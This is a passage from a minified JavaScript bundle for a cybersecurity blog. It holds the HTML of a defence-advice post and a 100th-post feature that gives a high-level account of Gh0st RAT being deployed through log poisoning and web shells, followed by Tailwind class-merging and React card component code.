        <li>📈 Establish <b>baseline activity</b> for SaaS and cloud apps, then trigger alerts for deviations like token reuse or impossible travel events.</li>
      </ul>
      <p>
        The earlier you detect and respond, the less damage attackers can do — turning a potential breach into a contained incident.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f3f4f6; margin-top:15px;">
      <h3 style="color:#ef4444;">🧠 Prepare for What’s Next</h3><br>
      <p>
        Threat actors evolve, and so must your defenses. Beyond reacting to incidents, organizations should build resilience and readiness into their core strategy. 
        Proactive preparation ensures that when — not if — an attack occurs, the impact is minimized, and recovery is swift.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📚 Conduct regular <b>tabletop exercises</b> focused on real-world attack scenarios like ransomware or supply-chain compromise.</li>
        <li>🧠 Invest in <b>endpoint detection & response (EDR)</b> and <b>DNS egress filtering</b> to stop attackers mid-operation.</li>
        <li>🔐 Strengthen identity controls — deploy <b>passkeys</b>, <b>phishing-resistant MFA</b>, and <b>adaptive access policies</b>.</li>
      </ul>
      <p>
        Remember: cybersecurity is a lifecycle, not a checklist. Preparation today is the difference between disruption and disaster tomorrow.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8fafc; border-radius:12px; color:#0f172a; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Stay Sharp. Patch Fast. Defend Better.</h3><br>
      <p>
        This week’s biggest takeaway? <b>Speed and visibility save businesses</b>.  
        The sooner you patch, the faster you detect, and the better you prepare — the harder you make it for adversaries to succeed.
      </p>
     
    </section>
  `},{id:"gh0strat-open-source-attack-2025",title:"100th Blog Special: The Ghost in the Code — When Trusted Tools Turn Rogue",summary:"Marking our 100th post, this special edition uncovers how China-linked hackers weaponized trust itself — twisting an open-source tool into a silent infiltrator that deployed Gh0st RAT across 100+ servers.",date:"2025-10-09",author:"EthicalByte",tags:["Gh0st RAT","China-Linked APT","Supply Chain","Open Source","Cyber Espionage"],imageKey:"gh0stRat100thBlogBanner",content:`
    <section style="padding:35px; font-family:'Poppins',sans-serif; background:radial-gradient(circle at top left,#000000,#1a0000); border-radius:16px; color:#f8f9fa; border:2px solid #ff1b1b; box-shadow:0 0 25px rgba(255,27,27,0.3);">
      <h2 style="color:#ff3b3b; text-align:center; font-size:30px; text-shadow:0 0 12px #ff1b1b;">
        💯th Blog Celebration | The Ghost in the Code 👻
      </h2>
      <p style="text-align:center; font-size:16px; color:#e0e0e0;">
        “Even heroes can be deceived — when trust turns into a weapon, the battlefield shifts to the code itself.”
      </p><br>
      <p>
        It’s poetic, almost cinematic — the very code designed to secure our digital future  
        was turned against us. <b>China-linked threat actors</b> have taken a 
        <b>legitimate open-source tool</b> and turned it into a weapon of stealth, control, and espionage.  
        This wasn’t brute force; it was elegance cloaked in deception.
      </p>
      <p>
        The attackers used a <b>log poisoning technique</b> to implant a <b>web shell</b> across servers.  
        Without triggering alarms, they deployed <b>Gh0st RAT</b> — a Remote Access Trojan capable of  
        full system compromise, surveillance, and persistent control.  
        Over <b>100 servers</b> in multiple industries were compromised —  
        all without a single zero-day exploit.
      </p>
      <p>
        But the twist? The <b>control panel interface was written in Russian</b>.  
        Whether it’s a false flag or cross-group collaboration, attribution just got complicated.
      </p>
    </section>

    <section style="padding:30px; background:linear-gradient(135deg,#220000,#111111); border-radius:16px; color:#f5f5f5; margin-top:25px; box-shadow:0 0 20px rgba(255,0,0,0.4);">
      <h3 style="color:#ffb703;">🧠 The Anatomy of the Attack</h3><br>
      <p>
        The adversaries didn’t need new malware; they needed trust.  
        Here’s how they turned open-source transparency into a tactical advantage:
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>⚙ <b>Exploited open-source utility</b> through log poisoning to inject malicious payloads.</li>
        <li>🧩 Deployed <b>Gh0st RAT</b> for deep surveillance and persistent access.</li>
        <li>👾 <b>Camouflaged communications</b> via AES-encrypted C2 traffic to avoid detection.</li>
        <li>🕵‍♂ Command-and-control panel <b>written in Russian</b> — a possible false-flag tactic.</li>
      </ul>
      <p>
        This operation underscores a chilling new era of cyber warfare:  
        <b>weaponized legitimacy</b>. The tools defenders trust most are now entry points for attackers.
      </p>
    </section>

    <section style="padding:30px; background:radial-gradient(circle at bottom right,#1a0000,#0a0a0a); border-radius:16px; color:#e2e8f0; margin-top:25px; box-shadow:inset 0 0 20px rgba(255,50,50,0.3);">
      <h3 style="color:#06d6a0;">💥 Why This Attack Changes Everything</h3><br>
      <p>
        This wasn’t about exploiting a system — it was about exploiting <b>trust itself</b>.  
        Open-source ecosystems thrive on collaboration, but also depend on  
        the integrity of every contributor. Compromise that chain, and you compromise the world.
      </p>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🧩 <b>Supply chain trust</b> has become the weakest link.</li>
        <li>🚨 <b>Attackers are agile</b> — exploiting community-driven innovation faster than it can be secured.</li>
        <li>🔄 <b>Behavioral analytics</b> must evolve — focusing on subtle activity, not static signatures.</li>
        <li>🧠 <b>Developers need visibility</b> — code provenance and dependency validation are now critical.</li>
      </ul>
      <p>
        In essence, this attack isn’t a bug — it’s a betrayal.
      </p>
    </section>

    <section style="padding:35px; background:linear-gradient(135deg,#ff1b1b,#2b0000); border-radius:16px; color:#ffffff; margin-top:25px; text-align:center; box-shadow:0 0 25px rgba(255,0,0,0.6);">
      <h3 style="font-size:22px; color:#fff;">⚔ The Lesson Behind the Code</h3><br>
      <p>
        Every milestone is a reflection of resilience.  
        EthicalByte began with one goal — to make cybersecurity *clear, visual, and human*.  
        Now, at our 100th post, we face a world where trust is the new perimeter.  
      </p>
      <p>
        <b>Every library. Every repo. Every dependency.</b>  
        They all carry the weight of the next possible compromise.  
        Security isn’t just about defense — it’s about awareness and adaptation.
      </p>
      
    </section>

    <section style="padding:40px; text-align:center; background:#ffffff; border-radius:16px; color:#000; margin-top:25px; border:2px solid #ff1b1b;">
      <h3 style="color:#ff1b1b;">🎉 100th Blog | The EthicalByte Legacy</h3><br>
      <p>
        💬 100 stories later, our message remains the same — <b>the future belongs to those who defend it</b>.  
        From darknets to data leaks, from malware to machine learning, we’ve chronicled  
        the pulse of cybersecurity with one guiding belief: *awareness saves*.
      </p>
      <p>
        To our readers, collaborators, and fellow defenders — this milestone isn’t ours alone.  
        It’s a salute to every mind that reads, questions, and acts.  
      </p>
      <p style="font-weight:bold; color:#ff1b1b; margin-top:15px;">
        Here’s to the next 100. Stronger. Sharper. Smarter. 🛡
      </p>
    </section>
  `}],q1=i=>Ed.find(t=>t.id===i);function Jm(i){var t,r,s="";if(typeof i=="string"||typeof i=="number")s+=i;else if(typeof i=="object")if(Array.isArray(i)){var a=i.length;for(t=0;t<a;t++)i[t]&&(r=Jm(i[t]))&&(s&&(s+=" "),s+=r)}else for(r in i)i[r]&&(s&&(s+=" "),s+=r);return s}function Pd(){for(var i,t,r=0,s="",a=arguments.length;r<a;r++)(i=arguments[r])&&(t=Jm(i))&&(s&&(s+=" "),s+=t);return s}function K1(){for(var i=0,t,r,s="";i<arguments.length;)(t=arguments[i++])&&(r=Qm(t))&&(s&&(s+=" "),s+=r);return s}function Qm(i){if(typeof i=="string")return i;for(var t,r="",s=0;s<i.length;s++)i[s]&&(t=Qm(i[s]))&&(r&&(r+=" "),r+=t);return r}var Id="-";function J1(i){var t=Y1(i),r=i.conflictingClassGroups,s=i.conflictingClassGroupModifiers,a=s===void 0?{}:s;function c(h){var p=h.split(Id);return p[0]===""&&p.length!==1&&p.shift(),Ym(p,t)||Q1(h)}function d(h,p){var f=r[h]||[];return p&&a[h]?[].concat(f,a[h]):f}return{getClassGroupId:c,getConflictingClassGroupIds:d}}function Ym(i,t){if(i.length===0)return t.classGroupId;var r=i[0],s=t.nextPart.get(r),a=s?Ym(i.slice(1),s):void 0;if(a)return a;if(t.validators.length!==0){var c=i.join(Id);return t.validators.find(function(d){var h=d.validator;return h(c)})?.classGroupId}}var Kf=/^\[(.+)\]$/;function Q1(i){if(Kf.test(i)){var t=Kf.exec(i)[1],r=t?.substring(0,t.indexOf(":"));if(r)return"arbitrary.."+r}}function Y1(i){var t=i.theme,r=i.prefix,s={nextPart:new Map,validators:[]},a=Z1(Object.entries(i.classGroups),r);return a.forEach(function(c){var d=c[0],h=c[1];qc(h,s,d,t)}),s}function qc(i,t,r,s){i.forEach(function(a){if(typeof a=="string"){var c=a===""?t:Jf(t,a);c.classGroupId=r;return}if(typeof a=="function"){if(X1(a)){qc(a(s),t,r,s);return}t.validators.push({validator:a,classGroupId:r});return}Object.entries(a).forEach(function(d){var h=d[0],p=d[1];qc(p,Jf(t,h),r,s)})})}function Jf(i,t){var r=i;return t.split(Id).forEach(function(s){r.nextPart.has(s)||r.nextPart.set(s,{nextPart:new Map,validators:[]}),r=r.nextPart.get(s)}),r}function X1(i){return i.isThemeGetter}function Z1(i,t){return t?i.map(function(r){var s=r[0],a=r[1],c=a.map(function(d){return typeof d=="string"?t+d:typeof d=="object"?Object.fromEntries(Object.entries(d).map(function(h){var p=h[0],f=h[1];return[t+p,f]})):d});return[s,c]}):i}function e2(i){if(i<1)return{get:function(){},set:function(){}};var t=0,r=new Map,s=new Map;function a(c,d){r.set(c,d),t++,t>i&&(t=0,s=r,r=new Map)}return{get:function(d){var h=r.get(d);if(h!==void 0)return h;if((h=s.get(d))!==void 0)return a(d,h),h},set:function(d,h){r.has(d)?r.set(d,h):a(d,h)}}}var Xm="!";function t2(i){var t=i.separator||":",r=t.length===1,s=t[0],a=t.length;return function(d){for(var h=[],p=0,f=0,m,y=0;y<d.length;y++){var v=d[y];if(p===0){if(v===s&&(r||d.slice(y,y+a)===t)){h.push(d.slice(f,y)),f=y+a;continue}if(v==="/"){m=y;continue}}v==="["?p++:v==="]"&&p--}var w=h.length===0?d:d.substring(f),P=w.startsWith(Xm),T=P?w.substring(1):w,C=m&&m>f?m-f:void 0;return{modifiers:h,hasImportantModifier:P,baseClassName:T,maybePostfixModifierPosition:C}}}function n2(i){if(i.length<=1)return i;var t=[],r=[];return i.forEach(function(s){var a=s[0]==="[";a?(t.push.apply(t,r.sort().concat([s])),r=[]):r.push(s)}),t.push.apply(t,r.sort()),t}function i2(i){return{cache:e2(i.cacheSize),splitModifiers:t2(i),...J1(i)}}var r2=/\s+/;function s2(i,t){var r=t.splitModifiers,s=t.getClassGroupId,a=t.getConflictingClassGroupIds,c=new Set;return i.trim().split(r2).map(function(d){var h=r(d),p=h.modifiers,f=h.hasImportantModifier,m=h.baseClassName,y=h.maybePostfixModifierPosition,v=s(y?m.substring(0,y):m),w=!!y;if(!v){if(!y)return{isTailwindClass:!1,originalClassName:d};if(v=s(m),!v)return{isTailwindClass:!1,originalClassName:d};w=!1}var P=n2(p).join(":"),T=f?P+Xm:P;return{isTailwindClass:!0,modifierId:T,classGroupId:v,originalClassName:d,hasPostfixModifier:w}}).reverse().filter(function(d){if(!d.isTailwindClass)return!0;var h=d.modifierId,p=d.classGroupId,f=d.hasPostfixModifier,m=h+p;return c.has(m)?!1:(c.add(m),a(p,f).forEach(function(y){return c.add(h+y)}),!0)}).reverse().map(function(d){return d.originalClassName}).join(" ")}function o2(){for(var i=arguments.length,t=new Array(i),r=0;r<i;r++)t[r]=arguments[r];var s,a,c,d=h;function h(f){var m=t[0],y=t.slice(1),v=y.reduce(function(w,P){return P(w)},m());return s=i2(v),a=s.cache.get,c=s.cache.set,d=p,p(f)}function p(f){var m=a(f);if(m)return m;var y=s2(f,s);return c(f,y),y}return function(){return d(K1.apply(null,arguments))}}function Me(i){var t=function(s){return s[i]||[]};return t.isThemeGetter=!0,t}var Zm=/^\[(?:([a-z-]+):)?(.+)\]$/i,a2=/^\d+\/\d+$/,l2=new Set(["px","full","screen"]),c2=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,d2=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,u2=/^-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/;function Ut(i){return di(i)||l2.has(i)||a2.test(i)||Kc(i)}function Kc(i){return mi(i,"length",y2)}function h2(i){return mi(i,"size",ey)}function p2(i){return mi(i,"position",ey)}function f2(i){return mi(i,"url",b2)}function Do(i){return mi(i,"number",di)}function di(i){return!Number.isNaN(Number(i))}function g2(i){return i.endsWith("%")&&di(i.slice(0,-1))}function Kr(i){return Qf(i)||mi(i,"number",Qf)}function me(i){return Zm.test(i)}function Jr(){return!0}function Dn(i){return c2.test(i)}function m2(i){return mi(i,"",v2)}function mi(i,t,r){var s=Zm.exec(i);return s?s[1]?s[1]===t:r(s[2]):!1}function y2(i){return d2.test(i)}function ey(){return!1}function b2(i){return i.startsWith("url(")}function Qf(i){return Number.isInteger(Number(i))}function v2(i){return u2.test(i)}function w2(){var i=Me("colors"),t=Me("spacing"),r=Me("blur"),s=Me("brightness"),a=Me("borderColor"),c=Me("borderRadius"),d=Me("borderSpacing"),h=Me("borderWidth"),p=Me("contrast"),f=Me("grayscale"),m=Me("hueRotate"),y=Me("invert"),v=Me("gap"),w=Me("gradientColorStops"),P=Me("gradientColorStopPositions"),T=Me("inset"),C=Me("margin"),L=Me("opacity"),R=Me("padding"),M=Me("saturate"),O=Me("scale"),W=Me("sepia"),J=Me("skew"),G=Me("space"),X=Me("translate"),ie=function(){return["auto","contain","none"]},ge=function(){return["auto","hidden","clip","visible","scroll"]},Ae=function(){return["auto",me,t]},$=function(){return[me,t]},ae=function(){return["",Ut]},H=function(){return["auto",di,me]},he=function(){return["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"]},oe=function(){return["solid","dashed","dotted","double","none"]},ue=function(){return["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity","plus-lighter"]},U=function(){return["start","end","center","between","around","evenly","stretch"]},Q=function(){return["","0",me]},q=function(){return["auto","avoid","all","avoid-page","page","left","right","column"]},E=function(){return[di,Do]},B=function(){return[di,me]};return{cacheSize:500,theme:{colors:[Jr],spacing:[Ut],blur:["none","",Dn,me],brightness:E(),borderColor:[i],borderRadius:["none","","full",Dn,me],borderSpacing:$(),borderWidth:ae(),contrast:E(),grayscale:Q(),hueRotate:B(),invert:Q(),gap:$(),gradientColorStops:[i],gradientColorStopPositions:[g2,Kc],inset:Ae(),margin:Ae(),opacity:E(),padding:$(),saturate:E(),scale:E(),sepia:Q(),skew:B(),space:$(),translate:$()},classGroups:{aspect:[{aspect:["auto","square","video",me]}],container:["container"],columns:[{columns:[Dn]}],"break-after":[{"break-after":q()}],"break-before":[{"break-before":q()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none"]}],clear:[{clear:["left","right","both","none"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[].concat(he(),[me])}],overflow:[{overflow:ge()}],"overflow-x":[{"overflow-x":ge()}],"overflow-y":[{"overflow-y":ge()}],overscroll:[{overscroll:ie()}],"overscroll-x":[{"overscroll-x":ie()}],"overscroll-y":[{"overscroll-y":ie()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[T]}],"inset-x":[{"inset-x":[T]}],"inset-y":[{"inset-y":[T]}],start:[{start:[T]}],end:[{end:[T]}],top:[{top:[T]}],right:[{right:[T]}],bottom:[{bottom:[T]}],left:[{left:[T]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",Kr]}],basis:[{basis:Ae()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",me]}],grow:[{grow:Q()}],shrink:[{shrink:Q()}],order:[{order:["first","last","none",Kr]}],"grid-cols":[{"grid-cols":[Jr]}],"col-start-end":[{col:["auto",{span:["full",Kr]},me]}],"col-start":[{"col-start":H()}],"col-end":[{"col-end":H()}],"grid-rows":[{"grid-rows":[Jr]}],"row-start-end":[{row:["auto",{span:[Kr]},me]}],"row-start":[{"row-start":H()}],"row-end":[{"row-end":H()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",me]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",me]}],gap:[{gap:[v]}],"gap-x":[{"gap-x":[v]}],"gap-y":[{"gap-y":[v]}],"justify-content":[{justify:["normal"].concat(U())}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal"].concat(U(),["baseline"])}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[].concat(U(),["baseline"])}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[R]}],px:[{px:[R]}],py:[{py:[R]}],ps:[{ps:[R]}],pe:[{pe:[R]}],pt:[{pt:[R]}],pr:[{pr:[R]}],pb:[{pb:[R]}],pl:[{pl:[R]}],m:[{m:[C]}],mx:[{mx:[C]}],my:[{my:[C]}],ms:[{ms:[C]}],me:[{me:[C]}],mt:[{mt:[C]}],mr:[{mr:[C]}],mb:[{mb:[C]}],ml:[{ml:[C]}],"space-x":[{"space-x":[G]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[G]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit",me,t]}],"min-w":[{"min-w":["min","max","fit",me,Ut]}],"max-w":[{"max-w":["0","none","full","min","max","fit","prose",{screen:[Dn]},Dn,me]}],h:[{h:[me,t,"auto","min","max","fit"]}],"min-h":[{"min-h":["min","max","fit",me,Ut]}],"max-h":[{"max-h":[me,t,"min","max","fit"]}],"font-size":[{text:["base",Dn,Kc]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Do]}],"font-family":[{font:[Jr]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",me]}],"line-clamp":[{"line-clamp":["none",di,Do]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",me,Ut]}],"list-image":[{"list-image":["none",me]}],"list-style-type":[{list:["none","disc","decimal",me]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[i]}],"placeholder-opacity":[{"placeholder-opacity":[L]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[i]}],"text-opacity":[{"text-opacity":[L]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[].concat(oe(),["wavy"])}],"text-decoration-thickness":[{decoration:["auto","from-font",Ut]}],"underline-offset":[{"underline-offset":["auto",me,Ut]}],"text-decoration-color":[{decoration:[i]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],indent:[{indent:$()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",me]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",me]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[L]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[].concat(he(),[p2])}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",h2]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},f2]}],"bg-color":[{bg:[i]}],"gradient-from-pos":[{from:[P]}],"gradient-via-pos":[{via:[P]}],"gradient-to-pos":[{to:[P]}],"gradient-from":[{from:[w]}],"gradient-via":[{via:[w]}],"gradient-to":[{to:[w]}],rounded:[{rounded:[c]}],"rounded-s":[{"rounded-s":[c]}],"rounded-e":[{"rounded-e":[c]}],"rounded-t":[{"rounded-t":[c]}],"rounded-r":[{"rounded-r":[c]}],"rounded-b":[{"rounded-b":[c]}],"rounded-l":[{"rounded-l":[c]}],"rounded-ss":[{"rounded-ss":[c]}],"rounded-se":[{"rounded-se":[c]}],"rounded-ee":[{"rounded-ee":[c]}],"rounded-es":[{"rounded-es":[c]}],"rounded-tl":[{"rounded-tl":[c]}],"rounded-tr":[{"rounded-tr":[c]}],"rounded-br":[{"rounded-br":[c]}],"rounded-bl":[{"rounded-bl":[c]}],"border-w":[{border:[h]}],"border-w-x":[{"border-x":[h]}],"border-w-y":[{"border-y":[h]}],"border-w-s":[{"border-s":[h]}],"border-w-e":[{"border-e":[h]}],"border-w-t":[{"border-t":[h]}],"border-w-r":[{"border-r":[h]}],"border-w-b":[{"border-b":[h]}],"border-w-l":[{"border-l":[h]}],"border-opacity":[{"border-opacity":[L]}],"border-style":[{border:[].concat(oe(),["hidden"])}],"divide-x":[{"divide-x":[h]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[h]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[L]}],"divide-style":[{divide:oe()}],"border-color":[{border:[a]}],"border-color-x":[{"border-x":[a]}],"border-color-y":[{"border-y":[a]}],"border-color-t":[{"border-t":[a]}],"border-color-r":[{"border-r":[a]}],"border-color-b":[{"border-b":[a]}],"border-color-l":[{"border-l":[a]}],"divide-color":[{divide:[a]}],"outline-style":[{outline:[""].concat(oe())}],"outline-offset":[{"outline-offset":[me,Ut]}],"outline-w":[{outline:[Ut]}],"outline-color":[{outline:[i]}],"ring-w":[{ring:ae()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[i]}],"ring-opacity":[{"ring-opacity":[L]}],"ring-offset-w":[{"ring-offset":[Ut]}],"ring-offset-color":[{"ring-offset":[i]}],shadow:[{shadow:["","inner","none",Dn,m2]}],"shadow-color":[{shadow:[Jr]}],opacity:[{opacity:[L]}],"mix-blend":[{"mix-blend":ue()}],"bg-blend":[{"bg-blend":ue()}],filter:[{filter:["","none"]}],blur:[{blur:[r]}],brightness:[{brightness:[s]}],contrast:[{contrast:[p]}],"drop-shadow":[{"drop-shadow":["","none",Dn,me]}],grayscale:[{grayscale:[f]}],"hue-rotate":[{"hue-rotate":[m]}],invert:[{invert:[y]}],saturate:[{saturate:[M]}],sepia:[{sepia:[W]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[r]}],"backdrop-brightness":[{"backdrop-brightness":[s]}],"backdrop-contrast":[{"backdrop-contrast":[p]}],"backdrop-grayscale":[{"backdrop-grayscale":[f]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[m]}],"backdrop-invert":[{"backdrop-invert":[y]}],"backdrop-opacity":[{"backdrop-opacity":[L]}],"backdrop-saturate":[{"backdrop-saturate":[M]}],"backdrop-sepia":[{"backdrop-sepia":[W]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[d]}],"border-spacing-x":[{"border-spacing-x":[d]}],"border-spacing-y":[{"border-spacing-y":[d]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",me]}],duration:[{duration:B()}],ease:[{ease:["linear","in","out","in-out",me]}],delay:[{delay:B()}],animate:[{animate:["none","spin","ping","pulse","bounce",me]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[O]}],"scale-x":[{"scale-x":[O]}],"scale-y":[{"scale-y":[O]}],rotate:[{rotate:[Kr,me]}],"translate-x":[{"translate-x":[X]}],"translate-y":[{"translate-y":[X]}],"skew-x":[{"skew-x":[J]}],"skew-y":[{"skew-y":[J]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",me]}],accent:[{accent:["auto",i]}],appearance:["appearance-none"],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",me]}],"caret-color":[{caret:[i]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":$()}],"scroll-mx":[{"scroll-mx":$()}],"scroll-my":[{"scroll-my":$()}],"scroll-ms":[{"scroll-ms":$()}],"scroll-me":[{"scroll-me":$()}],"scroll-mt":[{"scroll-mt":$()}],"scroll-mr":[{"scroll-mr":$()}],"scroll-mb":[{"scroll-mb":$()}],"scroll-ml":[{"scroll-ml":$()}],"scroll-p":[{"scroll-p":$()}],"scroll-px":[{"scroll-px":$()}],"scroll-py":[{"scroll-py":$()}],"scroll-ps":[{"scroll-ps":$()}],"scroll-pe":[{"scroll-pe":$()}],"scroll-pt":[{"scroll-pt":$()}],"scroll-pr":[{"scroll-pr":$()}],"scroll-pb":[{"scroll-pb":$()}],"scroll-pl":[{"scroll-pl":$()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","pinch-zoom","manipulation",{pan:["x","left","right","y","up","down"]}]}],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",me]}],fill:[{fill:[i,"none"]}],"stroke-w":[{stroke:[Ut,Do]}],stroke:[{stroke:[i,"none"]}],sr:["sr-only","not-sr-only"]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}}var ty=o2(w2);function yt(...i){return ty(Pd(i))}const ny=Ee.forwardRef(({className:i,...t},r)=>x.jsx("div",{ref:r,className:yt("rounded-lg border bg-card text-card-foreground shadow-sm",i),...t}));ny.displayName="Card";const iy=Ee.forwardRef(({className:i,...t},r)=>x.jsx("div",{ref:r,className:yt("flex flex-col space-y-1.5 p-6",i),...t}));iy.displayName="CardHeader";const ry=Ee.forwardRef(({className:i,...t},r)=>x.jsx("h3",{ref:r,className:yt("text-2xl font-semibold leading-none tracking-tight",i),...t}));ry.displayName="CardTitle";const sy=Ee.forwardRef(({className:i,...t},r)=>x.jsx("p",{ref:r,className:yt("text-sm text-muted-foreground",i),...t}));sy.displayName="CardDescription";const oy=Ee.forwardRef(({className:i,...t},r)=>x.jsx("div",{ref:r,className:yt("p-6 pt-0",i),...t}));oy.displayName="CardContent";const ay=Ee.forwardRef(({className:i,...t},r)=>x.jsx("div",{ref:r,className:yt("flex items-center p-6 pt-0",i),...t}));ay.displayName="CardFooter";function Yf(i,t){if(typeof i=="function")return i(t);i!=null&&(i.current=t)}function ly(...i){return t=>{let r=!1;const 